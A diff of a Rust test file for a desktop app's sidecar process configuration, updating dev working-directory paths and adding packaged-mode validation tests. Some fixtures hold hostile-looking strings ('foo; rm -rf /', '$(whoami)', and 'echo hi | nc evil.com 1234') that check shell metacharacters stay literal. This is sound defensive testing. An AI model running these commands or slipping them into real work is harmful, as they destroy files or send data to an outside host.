@@ -6,8 +6,8 @@
 #![allow(dead_code)]
 
 use std::fs;
-use std::path::PathBuf;
 use std::path::Path;
+use std::path::PathBuf;
 
 use tempfile::{tempdir, TempDir};
 
@@ -43,7 +43,7 @@ fn dev_skeleton_json(agent_override: &str, server_override: &str) -> String {
 
 const AGENT_OK: &str = r#"{
     "cmd": ["uv", "run", "paladin-agent", "serve", "--dev"],
-    "cwd": "../../apps/agent",
+    "cwd": "../../agent",
     "env": {},
     "port": 9876,
     "health": { "liveness": { "path": "/health", "expect_status": 200 } },
@@ -52,7 +52,7 @@ const AGENT_OK: &str = r#"{
 
 const SERVER_OK: &str = r#"{
     "cmd": ["go", "run", "./cmd/server"],
-    "cwd": "../../apps/server",
+    "cwd": "../../server",
     "env": {},
     "port": 9880,
     "health": {
@@ -92,6 +92,29 @@ fn test_load_valid_dev_config_round_trip() {
 }
 
 #[test]
+fn test_dev_config_cwd_paths_resolve_from_src_tauri_manifest_dir() {
+    let (_dir, path) = write_temp_config(DEV_CONFIG_JSON);
+    let cfg = ProcessConfig::load_from_path(&path).expect("dev config loads");
+    let manifest_dir = Path::new(env!("CARGO_MANIFEST_DIR"));
+
+    for name in [ProcessNameKey::Agent, ProcessNameKey::Server] {
+        let entry = cfg.processes.get(&name).expect("process exists");
+        let cwd = entry.cwd.as_ref().expect("dev process cwd configured");
+        let resolved = if cwd.is_absolute() {
+            cwd.clone()
+        } else {
+            manifest_dir.join(cwd)
+        };
+
+        assert!(
+            resolved.is_dir(),
+            "{name:?} cwd must resolve from src-tauri manifest dir to an existing directory: {}",
+            resolved.display()
+        );
+    }
+}
+
+#[test]
 fn test_load_not_found_returns_not_found_error() {
     let dir = tempdir().expect("tempdir");
     let path = dir.path().join("definitely-missing.json");
@@ -117,7 +140,7 @@ fn test_cmd_single_string_rejected_by_serde() {
     // SPEC Prohibition P1: cmd 必须是 Vec<String>,单字符串形态在 serde 反序列化阶段拒绝。
     let agent = r#"{
         "cmd": "uv run foo",
-        "cwd": "../../apps/agent",
+        "cwd": "../../agent",
         "env": {},
         "port": 9876,
         "health": { "liveness": { "path": "/health", "expect_status": 200 } },
@@ -137,7 +160,7 @@ fn test_env_value_literal_no_shell_expansion() {
     // SPEC Prohibition P1: env 字段值不展开 ${VAR},字面值透传。
     let agent = r#"{
         "cmd": ["uv", "run", "paladin-agent", "serve", "--dev"],
-        "cwd": "../../apps/agent",
+        "cwd": "../../agent",
         "env": { "FOO": "${BAR}" },
         "port": 9876,
         "health": { "liveness": { "path": "/health", "expect_status": 200 } },
@@ -158,7 +181,7 @@ fn test_env_value_literal_no_shell_expansion() {
 fn test_validate_rejects_port_zero() {
     let agent = r#"{
         "cmd": ["uv", "run", "paladin-agent", "serve", "--dev"],
-        "cwd": "../../apps/agent",
+        "cwd": "../../agent",
         "env": {},
         "port": 0,
         "health": { "liveness": { "path": "/health", "expect_status": 200 } },
@@ -179,7 +202,7 @@ fn test_validate_rejects_port_out_of_range_via_serde() {
     // 这是 u16 类型层 + validate 双重锁的第一层(SPEC Prohibition P1 类型层强制)。
     let agent = r#"{
         "cmd": ["uv", "run", "paladin-agent", "serve", "--dev"],
-        "cwd": "../../apps/agent",
+        "cwd": "../../agent",
         "env": {},
         "port": 65536,
         "health": { "liveness": { "path": "/health", "expect_status": 200 } },
@@ -198,7 +221,7 @@ fn test_validate_rejects_port_out_of_range_via_serde() {
 fn test_validate_rejects_empty_cmd_array() {
     let agent = r#"{
         "cmd": [],
-        "cwd": "../../apps/agent",
+        "cwd": "../../agent",
         "env": {},
         "port": 9876,
         "health": { "liveness": { "path": "/health", "expect_status": 200 } },
@@ -218,7 +241,7 @@ fn test_validate_rejects_missing_liveness() {
     // liveness 是 EndpointConfig 必填(非 Option),缺失在 serde 阶段拒绝(ParseError)。
     let agent = r#"{
         "cmd": ["uv", "run", "paladin-agent", "serve", "--dev"],
-        "cwd": "../../apps/agent",
+        "cwd": "../../agent",
         "env": {},
         "port": 9876,
         "health": {},
@@ -231,6 +254,125 @@ fn test_validate_rejects_missing_liveness() {
         matches!(err, ConfigError::ParseError(_)),
         "expected ParseError for missing liveness, got: {err:?}"
     );
+}
+
+// ---------------------------------------------------------------------------
+// Phase 07.4 — packaged runtime mode validation
+// ---------------------------------------------------------------------------
+
+fn packaged_skeleton_json(agent_override: &str, server_override: &str) -> String {
+    format!(
+        r#"{{
+            "mode": "packaged",
+            "processes": {{
+                "agent": {agent_override},
+                "server": {server_override}
+            }},
+            "backoff_secs": [1, 2, 4, 8, 16],
+            "max_restarts": 5,
+            "shutdown_grace_secs": 5
+        }}"#
+    )
+}
+
+const PACKAGED_AGENT_OK: &str = r#"{
+    "cmd": ["paladin-agent-sidecar", "serve"],
+    "cwd": null,
+    "env": {},
+    "port": 9876,
+    "health": { "liveness": { "path": "/health", "expect_status": 200 } },
+    "startup_grace_secs": 5
+}"#;
+
+const PACKAGED_SERVER_OK: &str = r#"{
+    "cmd": ["paladin-server-sidecar"],
+    "cwd": null,
+    "env": {},
+    "port": 9880,
+    "health": {
+        "liveness": { "path": "/healthz", "expect_status": 200 },
+        "readiness": { "path": "/readyz", "expect_status": 200 }
+    },
+    "startup_grace_secs": 5
+}"#;
+
+#[test]
+fn test_validate_rejects_invalid_mode() {
+    let raw = packaged_skeleton_json(PACKAGED_AGENT_OK, PACKAGED_SERVER_OK)
+        .replace(r#""mode": "packaged""#, r#""mode": "prod""#);
+    let (_dir, path) = write_temp_config(&raw);
+    let err = ProcessConfig::load_from_path(&path).expect_err("invalid mode rejected");
+    assert!(format!("{err}").contains("mode"));
+}
+
+#[test]
+fn test_packaged_rejects_uv_command() {
+    let agent = r#"{
+        "cmd": ["uv", "run", "paladin-agent", "serve"],
+        "cwd": null,
+        "env": {},
+        "port": 9876,
+        "health": { "liveness": { "path": "/health", "expect_status": 200 } },
+        "startup_grace_secs": 5
+    }"#;
+    let raw = packaged_skeleton_json(agent, PACKAGED_SERVER_OK);
+    let (_dir, path) = write_temp_config(&raw);
+    let err = ProcessConfig::load_from_path(&path).expect_err("uv rejected");
+    let msg = format!("{err}");
+    assert!(msg.contains("packaged") && msg.contains("uv"));
+}
+
+#[test]
+fn test_packaged_rejects_go_command() {
+    let server = r#"{
+        "cmd": ["go", "run", "./cmd/server"],
+        "cwd": null,
+        "env": {},
+        "port": 9880,
+        "health": { "liveness": { "path": "/healthz", "expect_status": 200 } },
+        "startup_grace_secs": 5
+    }"#;
+    let raw = packaged_skeleton_json(PACKAGED_AGENT_OK, server);
+    let (_dir, path) = write_temp_config(&raw);
+    let err = ProcessConfig::load_from_path(&path).expect_err("go rejected");
+    let msg = format!("{err}");
+    assert!(msg.contains("packaged") && msg.contains("go"));
+}
+
+#[test]
+fn test_packaged_rejects_repo_relative_dev_cwd() {
+    for cwd in ["../../agent", "../../server"] {
+        let agent = format!(
+            r#"{{
+                "cmd": ["paladin-agent-sidecar"],
+                "cwd": "{cwd}",
+                "env": {{}},
+                "port": 9876,
+                "health": {{ "liveness": {{ "path": "/health", "expect_status": 200 }} }},
+                "startup_grace_secs": 5
+            }}"#
+        );
+        let raw = packaged_skeleton_json(&agent, PACKAGED_SERVER_OK);
+        let (_dir, path) = write_temp_config(&raw);
+        let err = ProcessConfig::load_from_path(&path).expect_err("repo cwd rejected");
+        let msg = format!("{err}");
+        assert!(msg.contains("repo-relative") && msg.contains(cwd));
+    }
+}
+
+#[test]
+fn test_packaged_accepts_binary_like_command_shape() {
+    let raw = packaged_skeleton_json(PACKAGED_AGENT_OK, PACKAGED_SERVER_OK);
+    let (_dir, path) = write_temp_config(&raw);
+    let cfg = ProcessConfig::load_from_path(&path).expect("packaged sidecar config loads");
+    assert_eq!(cfg.mode, "packaged");
+}
+
+#[test]
+fn test_dev_skeleton_still_allows_dev_commands_and_cwd() {
+    let (_dir, path) = write_temp_config(DEV_CONFIG_JSON);
+    let cfg = ProcessConfig::load_from_path(&path).expect("dev skeleton remains valid");
+    assert_eq!(cfg.mode, "dev");
 }
 
 #[test]
@@ -288,7 +430,7 @@ fn test_cmd_with_shell_metacharacters_preserved_as_literal_arg() {
     // 即使含 shell 元字符 (; | $ `),也是程序名/参数的字面字符。
     let agent = r#"{
         "cmd": ["echo", "foo; rm -rf /", "$HOME", "$(whoami)"],
-        "cwd": "../../apps/agent",
+        "cwd": "../../agent",
         "env": {},
         "port": 9876,
         "health": { "liveness": { "path": "/health", "expect_status": 200 } },
@@ -299,9 +441,15 @@ fn test_cmd_with_shell_metacharacters_preserved_as_literal_arg() {
     let cfg = ProcessConfig::load_from_path(&path).expect("literal metachars load");
     let agent = cfg.processes.get(&ProcessNameKey::Agent).expect("agent");
     assert_eq!(agent.cmd.len(), 4);
-    assert_eq!(agent.cmd[1], "foo; rm -rf /", "metacharacter preserved verbatim");
+    assert_eq!(
+        agent.cmd[1], "foo; rm -rf /",
+        "metacharacter preserved verbatim"
+    );
     assert_eq!(agent.cmd[2], "$HOME", "dollar-brace preserved verbatim");
-    assert_eq!(agent.cmd[3], "$(whoami)", "subshell syntax preserved verbatim");
+    assert_eq!(
+        agent.cmd[3], "$(whoami)",
+        "subshell syntax preserved verbatim"
+    );
 }
 
 #[test]
@@ -310,7 +458,7 @@ fn test_env_value_with_subcommand_preserved_as_literal() {
     // tokio::process::Command::env(),不经过 shell 展开。
     let agent = r#"{
         "cmd": ["uv", "run", "paladin-agent", "serve", "--dev"],
-        "cwd": "../../apps/agent",
+        "cwd": "../../agent",
         "env": { "A": "$(whoami)", "B": "${PATH}", "C": "echo hi | nc evil.com 1234" },
         "port": 9876,
         "health": { "liveness": { "path": "/health", "expect_status": 200 } },
